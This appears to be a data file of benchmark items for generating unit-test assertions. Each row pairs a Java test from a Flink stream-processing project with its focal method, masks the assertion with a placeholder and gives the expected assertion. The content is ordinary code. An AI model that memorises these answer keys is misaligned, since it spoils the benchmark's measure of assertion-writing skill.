"shouldNotReturnAnyPostProcessor() { when(configuration.getString(Constants.FLINK_SQL_QUERY_KEY, Constants.FLINK_SQL_QUERY_DEFAULT)).thenReturn(""test-sql""); when(configuration.getBoolean(Constants.PROCESSOR_POSTPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_POSTPROCESSOR_ENABLE_DEFAULT)).thenReturn(false); List<PostProcessor> postProcessors = PostProcessorFactory.getPostProcessors(daggerContext, stencilClientOrchestrator, columnNames, metricsTelemetryExporter);  ""<AssertPlaceHolder>""; }
getPostProcessors(DaggerContext daggerContext, StencilClientOrchestrator stencilClientOrchestrator, String[] columnNames, MetricsTelemetryExporter metricsTelemetryExporter) { List<PostProcessor> postProcessors = new ArrayList<>();  if (Arrays.stream(columnNames).anyMatch(s -> Pattern.compile("".*\\blongbow.*key\\b.*"").matcher(s).find())) { postProcessors.add(getLongBowProcessor(columnNames, daggerContext.getConfiguration(), metricsTelemetryExporter, stencilClientOrchestrator)); } if (daggerContext.getConfiguration().getBoolean(Constants.PROCESSOR_POSTPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_POSTPROCESSOR_ENABLE_DEFAULT)) { postProcessors.add(new ParentPostProcessor(daggerContext, stencilClientOrchestrator, metricsTelemetryExporter)); } if (daggerContext.getConfiguration().getBoolean(Constants.METRIC_TELEMETRY_ENABLE_KEY, Constants.METRIC_TELEMETRY_ENABLE_VALUE_DEFAULT)) { postProcessors.add(new TelemetryProcessor(metricsTelemetryExporter)); } return postProcessors; }"	assertEquals(0, postProcessors.size())
"shouldReturnPreProcessors() { when(configuration.getBoolean(Constants.PROCESSOR_PREPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_PREPROCESSOR_ENABLE_DEFAULT)).thenReturn(true); when(configuration.getString(Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY, """")).thenReturn(preProcessorConfigJson); List<Preprocessor> preProcessors = PreProcessorFactory.getPreProcessors(daggerContext, ""booking"", metricsTelemetryExporter); ""<AssertPlaceHolder>""; }
getPreProcessors(DaggerContext daggerContext, String tableName, MetricsTelemetryExporter metricsTelemetryExporter) { return Collections.singletonList(new PreProcessorOrchestrator(daggerContext, metricsTelemetryExporter, tableName)); }"	assertEquals(1, preProcessors.size())
"shouldNotGetProcessors() { PreProcessorOrchestrator ppo = new PreProcessorOrchestrator(daggerContext, exporter, ""test""); Mockito.when(streamInfo.getColumnNames()).thenReturn(new String[0]); Mockito.when(streamInfo.getDataStream()).thenReturn(stream);  List<Preprocessor> processors = ppo.getProcessors();  ""<AssertPlaceHolder>""; }
getProcessors() { List<Preprocessor> preprocessors = new ArrayList<>(); if (canProcess(processorConfig)) { processorConfig .getTableTransformers() .stream() .filter(x -> x.getTableName().equals(this.tableName)) .forEach(elem -> { TransformProcessor processor = new TransformProcessor( elem.getTableName(), TelemetryTypes.PRE_PROCESSOR_TYPE, elem.getTransformers(), daggerContext); processor.notifySubscriber(metricsTelemetryExporter); preprocessors.add(processor); }); } return preprocessors; }"	assertEquals(0, processors.size())
"shouldNotNullConfig() { when(configuration.getBoolean(Constants.PROCESSOR_PREPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_PREPROCESSOR_ENABLE_DEFAULT)).thenReturn(true); when(configuration.getString(Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY, """")).thenReturn(preProcessorConfigJson); PreProcessorOrchestrator ppo = new PreProcessorOrchestrator(daggerContext, exporter, ""test""); PreProcessorConfig preProcessorConfig = ppo.parseConfig(configuration); ""<AssertPlaceHolder>""; }
parseConfig(Configuration configuration) { if (!configuration.getBoolean(Constants.PROCESSOR_PREPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_PREPROCESSOR_ENABLE_DEFAULT)) { return null; } String configJson = configuration.getString(Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY, """"); PreProcessorConfig config; try { config = GSON.fromJson(configJson, PreProcessorConfig.class); } catch (JsonSyntaxException exception) { throw new InvalidJsonException(""Invalid JSON Given for "" + Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY); } return config; }"	assertNotNull(preProcessorConfig)
"shouldNotParseConfigWhenDisabled() { when(configuration.getBoolean(Constants.PROCESSOR_PREPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_PREPROCESSOR_ENABLE_DEFAULT)).thenReturn(false); when(configuration.getString(Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY, """")).thenReturn(preProcessorConfigJson); PreProcessorOrchestrator ppo = new PreProcessorOrchestrator(daggerContext, exporter, ""test""); PreProcessorConfig preProcessorConfig = ppo.parseConfig(configuration); ""<AssertPlaceHolder>""; }
parseConfig(Configuration configuration) { if (!configuration.getBoolean(Constants.PROCESSOR_PREPROCESSOR_ENABLE_KEY, Constants.PROCESSOR_PREPROCESSOR_ENABLE_DEFAULT)) { return null; } String configJson = configuration.getString(Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY, """"); PreProcessorConfig config; try { config = GSON.fromJson(configJson, PreProcessorConfig.class); } catch (JsonSyntaxException exception) { throw new InvalidJsonException(""Invalid JSON Given for "" + Constants.PROCESSOR_PREPROCESSOR_CONFIG_KEY); } return config; }"	assertNull(preProcessorConfig)
"shouldReturnEndpointQueryVariableValuesForPrimitiveDataFromDescriptor() { when(sourceConfig.getVariables()).thenReturn(""customer_id"");  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, ""123456""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	"assertArrayEquals(endpointOrQueryVariablesValues, new Object[]{""123456""})"
"shouldReturnEndpointQueryVariableValuesForPrimitiveDataIfInputColumnNamesAbsent() { when(sourceConfig.getVariables()).thenReturn(""id"");  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, ""123456""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	"assertArrayEquals(endpointOrQueryVariablesValues, new Object[]{""123456""})"
"shouldReturnJsonValueOfEndpointQueryValuesInCaseOfArray() { when(sourceConfig.getVariables()).thenReturn(""test_enums"");  Row row = new Row(2); Row inputData = new Row(2); List<Row> experimentsRow = new ArrayList<>(); Row row1 = new Row(1); row1.setField(0, TestEnumType.Enum.UNKNOWN); Row row2 = new Row(1); row2.setField(0, TestEnumType.Enum.TYPE1); experimentsRow.add(row1); experimentsRow.add(row2);   inputData.setField(1, experimentsRow); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""test_enums""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	"assertArrayEquals(new Object[]{""[""+I[UNKNOWN]"",""+I[TYPE1]""]""}, endpointOrQueryVariablesValues)"
"shouldReturnJsonValueOfEndpointQueryValuesIncaseOfComplexDatatype() { when(sourceConfig.getVariables()).thenReturn(""driver_pickup_location"");  Row row = new Row(2); Row inputData = new Row(2);  Row locationRow = new Row(9); locationRow.setField(0, ""test_driver""); locationRow.setField(2, 172.5d); locationRow.setField(3, 175.5d);  inputData.setField(1, locationRow); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""driver_pickup_location""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, ""driver_pickup_location"", resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	"assertArrayEquals(endpointOrQueryVariablesValues, new Object[]{""{""name"":""test_driver"",""address"":null,""latitude"":172.5,""longitude"":175.5,""type"":null,""note"":null,""place_id"":null,""accuracy_meter"":null,""gate_id"":null}""})"
"shouldReturnEndpointQueryVariableValuesForPrimitiveDataFromDescriptorInCaseOfMultipleStreams() { when(sourceConfig.getVariables()).thenReturn(""customer_id""); inputProtoClasses = new String[]{""org.raystack.dagger.consumer.TestBookingLogMessage"", ""org.raystack.dagger.consumer.TestBookingLogMessage""};  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, ""123456""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	"assertArrayEquals(endpointOrQueryVariablesValues, new Object[]{""123456""})"
"shouldInferEndpointVariablesFromTheCorrectStreams() { when(sourceConfig.getVariables()).thenReturn(""order_number,customer_url""); inputProtoClasses = new String[]{""org.raystack.dagger.consumer.TestBookingLogMessage"", ""org.raystack.dagger.consumer.TestBookingLogMessage""};  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, ""customer_url_test""); inputData.setField(0, ""test_order_number""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_url""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	"assertArrayEquals(endpointOrQueryVariablesValues, new Object[]{""test_order_number"", ""customer_url_test""})"
"shouldReturnEmptyObjectIfNoQueryVariables() { when(sourceConfig.getVariables()).thenReturn(""""); inputProtoClasses = new String[]{""org.raystack.dagger.consumer.TestBookingLogMessage"", ""org.raystack.dagger.consumer.TestBookingLogMessage""};  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, ""customer_url_test""); inputData.setField(0, ""test_order_number""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_url""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  ""<AssertPlaceHolder>""; }
getVariablesValue(RowManager rowManager, ExternalPostProcessorVariableType variableType, String variables, ResultFuture<Row> resultFuture) { if (StringUtils.isEmpty(variables)) { return new Object[0]; }  String[] requiredInputColumns = variables.split("",""); ArrayList<Object> inputColumnValues = new ArrayList<>(); if (descriptorMap == null) { descriptorMap = createDescriptorMap(requiredInputColumns, inputProtoClasses, resultFuture); }  for (String inputColumnName : requiredInputColumns) { int inputColumnIndex = columnNameManager.getInputIndex(inputColumnName); if (inputColumnIndex == -1) { throw new InvalidConfigurationException(String.format(""Column '%s' not found as configured in the '%s' variable"", inputColumnName, variableType)); }  Descriptors.FieldDescriptor fieldDescriptor = descriptorMap.get(inputColumnName); Object singleColumnValue; if (fieldDescriptor != null) { TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor); singleColumnValue = typeHandler.transformToJson(rowManager.getFromInput(inputColumnIndex)); } else { singleColumnValue = rowManager.getFromInput(inputColumnIndex); } inputColumnValues.add(singleColumnValue); } return inputColumnValues.toArray(); }"	assertArrayEquals(endpointOrQueryVariablesValues, new Object[]{})
"shouldCheckIfQueryIsValid() { when(sourceConfig.getVariables()).thenReturn(""customer_id""); when(sourceConfig.getPattern()).thenReturn(""""{\\""key\\"": \\""%s\\""}"""");  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, ""123456""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  boolean queryInvalid = endpointHandler.isQueryInvalid(resultFuture, rowManager, sourceConfig.getVariables(), endpointOrQueryVariablesValues); ""<AssertPlaceHolder>""; }
isQueryInvalid(ResultFuture<Row> resultFuture, RowManager rowManager, String variables, Object[] variablesValue) { if (!StringUtils.isEmpty(variables) && (Arrays.asList(variablesValue).isEmpty() || Arrays.stream(variablesValue).allMatch(""""::equals))) { LOGGER.warn(""Could not populate any request variable. Skipping external calls""); meterStatsManager.markEvent(ExternalSourceAspects.EMPTY_INPUT); resultFuture.complete(singleton(rowManager.getAll())); return true; } return false; }"	assertFalse(queryInvalid)
"shouldCheckIfQueryIsInValidInCaseOfSingeEmptyVariableValueForSingleField() { when(sourceConfig.getVariables()).thenReturn(""customer_id""); when(sourceConfig.getPattern()).thenReturn(""""{\\""key\\"": \\""%s\\""}"""");  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, """"); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  boolean queryInvalid = endpointHandler.isQueryInvalid(resultFuture, rowManager, sourceConfig.getVariables(), endpointOrQueryVariablesValues); ""<AssertPlaceHolder>""; verify(resultFuture, times(1)).complete(any()); verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.EMPTY_INPUT); }
isQueryInvalid(ResultFuture<Row> resultFuture, RowManager rowManager, String variables, Object[] variablesValue) { if (!StringUtils.isEmpty(variables) && (Arrays.asList(variablesValue).isEmpty() || Arrays.stream(variablesValue).allMatch(""""::equals))) { LOGGER.warn(""Could not populate any request variable. Skipping external calls""); meterStatsManager.markEvent(ExternalSourceAspects.EMPTY_INPUT); resultFuture.complete(singleton(rowManager.getAll())); return true; } return false; }"	assertTrue(queryInvalid)
"shouldCheckIfQueryIsValidInCaseOfSomeVariableValue() { when(sourceConfig.getVariables()).thenReturn(""order_number,customer_id""); when(sourceConfig.getPattern()).thenReturn(""""{\\""key\\"": \\""%s\\"", \\""other_key\\"": \\""%s\\""}"""");  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, """"); inputData.setField(0, ""test_order_number""); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  boolean queryInvalid = endpointHandler.isQueryInvalid(resultFuture, rowManager, sourceConfig.getVariables(), endpointOrQueryVariablesValues); ""<AssertPlaceHolder>""; }
isQueryInvalid(ResultFuture<Row> resultFuture, RowManager rowManager, String variables, Object[] variablesValue) { if (!StringUtils.isEmpty(variables) && (Arrays.asList(variablesValue).isEmpty() || Arrays.stream(variablesValue).allMatch(""""::equals))) { LOGGER.warn(""Could not populate any request variable. Skipping external calls""); meterStatsManager.markEvent(ExternalSourceAspects.EMPTY_INPUT); resultFuture.complete(singleton(rowManager.getAll())); return true; } return false; }"	assertFalse(queryInvalid)
"shouldCheckIfQueryIsInvalidInCaseOfAllVariableValues() { when(sourceConfig.getVariables()).thenReturn(""order_number,customer_id""); when(sourceConfig.getPattern()).thenReturn(""""{\\""key\\"": \\""%s\\"", \\""other_key\\"": \\""%s\\""}"""");  Row row = new Row(2); Row inputData = new Row(2); inputData.setField(1, """"); inputData.setField(0, """"); row.setField(0, inputData); row.setField(1, new Row(1)); RowManager rowManager = new RowManager(row);  endpointHandler = new EndpointHandler(meterStatsManager, errorReporter, inputProtoClasses, getColumnNameManager(new String[]{""order_number"", ""customer_id""}), descriptorManager); Object[] endpointOrQueryVariablesValues = endpointHandler .getVariablesValue(rowManager, Constants.ExternalPostProcessorVariableType.REQUEST_VARIABLES, sourceConfig.getVariables(), resultFuture);  boolean queryInvalid = endpointHandler.isQueryInvalid(resultFuture, rowManager, sourceConfig.getVariables(), endpointOrQueryVariablesValues); ""<AssertPlaceHolder>""; verify(meterStatsManager, times(1)).markEvent(ExternalSourceAspects.EMPTY_INPUT); }
isQueryInvalid(ResultFuture<Row> resultFuture, RowManager rowManager, String variables, Object[] variablesValue) { if (!StringUtils.isEmpty(variables) && (Arrays.asList(variablesValue).isEmpty() || Arrays.stream(variablesValue).allMatch(""""::equals))) { LOGGER.warn(""Could not populate any request variable. Skipping external calls""); meterStatsManager.markEvent(ExternalSourceAspects.EMPTY_INPUT); resultFuture.complete(singleton(rowManager.getAll())); return true; } return false; }"	assertTrue(queryInvalid)
"canDecorateShouldBeFalse() { ""<AssertPlaceHolder>""; }
canDecorate() { return false; }"	assertFalse(new FetchOutputDecorator(schemaConfig, false).canDecorate())
"shouldMapOutputDataFromRowManager() { FetchOutputDecorator fetchOutputDecorator = new FetchOutputDecorator(schemaConfig, false); Row parentRow = new Row(2); Row inputRow = new Row(3); Row outputRow = new Row(4); parentRow.setField(0, inputRow); parentRow.setField(1, outputRow);  ""<AssertPlaceHolder>""; }
map(Row input) { RowManager rowManager = new RowManager(input); return hasSQLTransformer ? convertLocalDateTime(rowManager.getOutputData()) : rowManager.getOutputData(); }"	assertEquals(outputRow, fetchOutputDecorator.map(parentRow))
"shouldConvertLocalDataTimeToTimestampIfSQLProcessorEnabled() { outputColumnNames = new String[]{""order_number"", ""service_area_id"", ""rowtime"", ""price""}; when(columnNameManager.getOutputColumnNames()).thenReturn(outputColumnNames); FetchOutputDecorator fetchOutputDecorator = new FetchOutputDecorator(schemaConfig, true); Row parentRow = new Row(2); Row inputRow = new Row(3); Row outputRow = new Row(4); Row expectedRow = new Row(4);  outputRow.setField(0, ""0""); expectedRow.setField(0, ""0""); outputRow.setField(1, 1); expectedRow.setField(1, 1); outputRow.setField(2, LocalDateTime.ofInstant(Instant.ofEpochMilli(1642402372L), ZoneId.of(""UTC""))); expectedRow.setField(2, Timestamp.valueOf(LocalDateTime.ofInstant(Instant.ofEpochMilli(1642402372L), ZoneId.of(""UTC"")))); outputRow.setField(3, 2.0F); expectedRow.setField(3, 2.0F);  parentRow.setField(0, inputRow); parentRow.setField(1, outputRow);  ""<AssertPlaceHolder>""; }
map(Row input) { RowManager rowManager = new RowManager(input); return hasSQLTransformer ? convertLocalDateTime(rowManager.getOutputData()) : rowManager.getOutputData(); }"	assertEquals(expectedRow, fetchOutputDecorator.map(parentRow))
"shouldNotConvertLocalDataTimeToTimestampIfSQLProcessorEnabledIfNull() { outputColumnNames = new String[]{""order_number"", ""service_area_id"", ""rowtime"", ""price""}; when(columnNameManager.getOutputColumnNames()).thenReturn(outputColumnNames); FetchOutputDecorator fetchOutputDecorator = new FetchOutputDecorator(schemaConfig, true); Row parentRow = new Row(2); Row inputRow = new Row(3); Row outputRow = new Row(4); Row expectedRow = new Row(4);  outputRow.setField(0, ""0""); expectedRow.setField(0, ""0""); outputRow.setField(1, 1); expectedRow.setField(1, 1); outputRow.setField(2, null); expectedRow.setField(2, null); outputRow.setField(3, 2.0F); expectedRow.setField(3, 2.0F);  parentRow.setField(0, inputRow); parentRow.setField(1, outputRow);  ""<AssertPlaceHolder>""; }
map(Row input) { RowManager rowManager = new RowManager(input); return hasSQLTransformer ? convertLocalDateTime(rowManager.getOutputData()) : rowManager.getOutputData(); }"	assertEquals(expectedRow, fetchOutputDecorator.map(parentRow))
"shouldNotConvertLocalDataTimeToTimestampIfSQLProcessorIsNotEnabled() { outputColumnNames = new String[]{""order_number"", ""service_area_id"", ""rowtime"", ""price""}; when(columnNameManager.getOutputColumnNames()).thenReturn(outputColumnNames); FetchOutputDecorator fetchOutputDecorator = new FetchOutputDecorator(schemaConfig, false); Row parentRow = new Row(2); Row inputRow = new Row(3); Row outputRow = new Row(4); Row expectedRow = new Row(4);  outputRow.setField(0, ""0""); expectedRow.setField(0, ""0""); outputRow.setField(1, 1); expectedRow.setField(1, 1); outputRow.setField(2, LocalDateTime.ofInstant(Instant.ofEpochMilli(1642402372L), ZoneId.of(""UTC""))); expectedRow.setField(2, LocalDateTime.ofInstant(Instant.ofEpochMilli(1642402372L), ZoneId.of(""UTC""))); outputRow.setField(3, 2.0F); expectedRow.setField(3, 2.0F);  parentRow.setField(0, inputRow); parentRow.setField(1, outputRow);  ""<AssertPlaceHolder>""; }
map(Row input) { RowManager rowManager = new RowManager(input); return hasSQLTransformer ? convertLocalDateTime(rowManager.getOutputData()) : rowManager.getOutputData(); }"	assertEquals(expectedRow, fetchOutputDecorator.map(parentRow))
"canDecorateShouldBeFalse() { InitializationDecorator initializationDecorator = new InitializationDecorator(new ColumnNameManager(new String[0], new ArrayList<>())); ""<AssertPlaceHolder>""; }
canDecorate() { return false; }"	assertFalse(initializationDecorator.canDecorate())
"shouldReturnPath() { OutputMapping outputMapping = new OutputMapping(""path""); String path = outputMapping.getPath(); ""<AssertPlaceHolder>""; }
getPath() { return path; }"	"assertEquals(""path"", path)"
"shouldReturnMandatoryFields() { OutputMapping outputMapping = new OutputMapping(""$.surge""); HashMap<String, Object> expectedMandatoryFields = new HashMap<>(); expectedMandatoryFields.put(""path"", ""$.surge""); HashMap<String, Object> actualMandatoryFields = outputMapping.getMandatoryFields(); ""<AssertPlaceHolder>""; }
getMandatoryFields() { HashMap<String, Object> mandatoryFields = new HashMap<>(); mandatoryFields.put(""path"", path); return mandatoryFields; }"	assertArrayEquals(expectedMandatoryFields.values().toArray(), actualMandatoryFields.values().toArray())
"shouldSetInOutputRow() { Row outputRow = new Row(4); Row parentRow = Row.of(new Row(3), outputRow); RowManager rowManager = new RowManager(parentRow);  rowManager.setInOutput(0, ""one"");  ""<AssertPlaceHolder>""; }
setInOutput(int fieldIndex, Object value) { getChildRow(OUTPUT_ROW_INDEX).setField(fieldIndex, value); }"	"assertEquals(""one"", outputRow.getField(0))"
"shouldGetParentRow() { Row parentRow = Row.of(new Row(3), new Row(4)); RowManager rowManager = new RowManager(parentRow);  Row expected = Row.of(new Row(3), new Row(4)); ""<AssertPlaceHolder>""; }
getAll() { return parentRow; }"	assertEquals(expected, rowManager.getAll())
